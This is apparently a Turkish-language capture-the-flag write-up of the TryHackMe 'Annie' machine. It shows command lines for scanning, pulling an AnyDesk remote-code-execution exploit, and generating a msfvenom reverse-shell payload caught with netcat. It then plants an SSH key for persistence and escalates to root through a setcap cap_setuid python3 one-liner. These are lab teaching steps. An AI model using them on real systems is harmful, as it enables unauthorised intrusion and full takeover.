---
title: "Annie Makine Çözümü"
date: "2025-03-22"
tags: ["ctf", "tryhackme"]
---

Merhabalar, bu yazımda sizlere TryHackMe platformunda bulunan “Annie” isimli makinenin çözümü anlatacağım. Keyifli Okumalar…

1 - Nmap aracını kullanarak makine üzerindeki açık portlar ve servisler hakkında detaylı bilgi ediniyorum.

```system
┌──(root㉿kali)-[/home/kali/Downloads]
└─# nmap -sS -sV 10.10.29.245
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-25 05:34 EDT
Nmap scan report for 10.10.29.245
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
7070/tcp open  ssl/realserver?
```

2 - Port taraması yaptıktan sonra "7070" portunda bir Anydesk servisi çalıştığını görüyorum. Searchsploit ile uygun bir exploit arıyorum.

```system
┌──(root㉿kali)-[/home/kali/Downloads]
└─# searchsploit "anydesk"       
-------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                  |  Path
-------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
AnyDesk 2.5.0 - Unquoted Service Path Privilege Escalation                                                                      | windows/local/40410.txt
AnyDesk 5.4.0 - Unquoted Service Path                                                                                           | windows/local/47883.txt
AnyDesk 5.5.2 - Remote Code Execution                                                                                           | linux/remote/49613.py
-------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results


┌──(root㉿kali)-[/home/kali/Downloads]
└─# searchsploit -m 49613  
  Exploit: AnyDesk 5.5.2 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/49613
     Path: /usr/share/exploitdb/exploits/linux/remote/49613.py
    Codes: CVE-2020-13160
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/kali/Downloads/49613.py
```

3 - Python dosyasını incelediğim zaman kendi ip-port bilgime uygun bir shellcode yazmam gerektiğini görüyorum. Msfvenom aracı ile shellcode oluşturuyorum.

```system
┌──(root㉿kali)-[/home/kali/Downloads]
└─# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.8.94.51 LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
Found 4 compatible encoders
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=17, char=0x00)
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 119 (iteration=0)
x64/xor chosen with final size 119
Payload size: 119 bytes
Final size of python file: 680 bytes
shellcode =  b""
*CENSORED*
```

4 - Exploit içindeki shellcode ve IP değişkenlerini değiştirip çalıştırıyorum ve bir bağlantı elde ediyorum. Daha sonra ilk bayrağı elde ediyorum.

```system
┌──(root㉿kali)-[/home/kali/Downloads]
└─# python2.7 49613.py
sending payload ...
reverse shell should connect within 5 seconds

┌──(root㉿kali)-[/home/kali/Downloads]
└─# nc -lvnp 4444                                                                                               
listening on [any] 4444 ...
connect to [10.8.94.51] from (UNKNOWN) [10.10.29.245] 41770
ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
user.txt
cat user.txt
*CENSORED*
```

5 - Kendi SSH anahtarımı makinenin kayıtlı anahtarlar dosyasına ekliyorum. Böylece parola olmadan SSH bağlantısı yapabileceğim.

```system
SHELL=/bin/bash script -q /dev/null
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

annie@desktop:/home/annie$ echo "ssh-rsa *CENSORED* root@kali" > .ssh/authorized_keys
<9JQSPRxaxjReNyls= root@kali" > .ssh/authorized_keys
```

6 - SSH bağlantısı kurduktan sonra suid biti aktif komutları listeliyorum ve "/sbin/setcap" komutunu görüyorum. Setcap, bir komuta yetenek (capabilities) tanımlamamızı sağlıyor.

```system
┌──(root㉿kali)-[/home/kali/Downloads]
└─# ssh annie@10.10.29.245
*
*
annie@desktop:~$ find / -perm -u=s -type f 2>/dev/null
/sbin/setcap <--------------------------
 /bin/mount
/bin/ping
/bin/su
/bin/fusermount
/bin/umount
/usr/sbin/pppd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/xorg/Xorg.wrap
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/arping
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
annie@desktop:~$
```

7 - Setcap ile pythona bir yetenek veriyorum. "cap_setuid" süreçlerin, kullanıcı kimliklerini değiştirebilmesine izin veren bir yetenektir. "+ep" ise e (effective) modu, belirtilen yeteneğin etkin hale getirilmesini sağlar. p (permanent) modu ise yeteneğin kalıcı olarak atanmasını sağlar. Daha sonra GTFObins sitesinden bu yeteneği nasıl suistimal edeceğimi öğreniyorum. Root kullanıcısına geçtikten sonra ikinci bayrağı elde ediyorum.

```system
annie@desktop:~$  cp /usr/bin/python3 .
annie@desktop:~$ /sbin/setcap cap_setuid+ep python3
root@desktop:~# getcap / -r 2>/dev/null
/home/annie/python3 = cap_setuid+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
annie@desktop:~$ ./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@desktop:~# whoami
root
root@desktop:~# cat /root/root.txt
*CENSORED*
```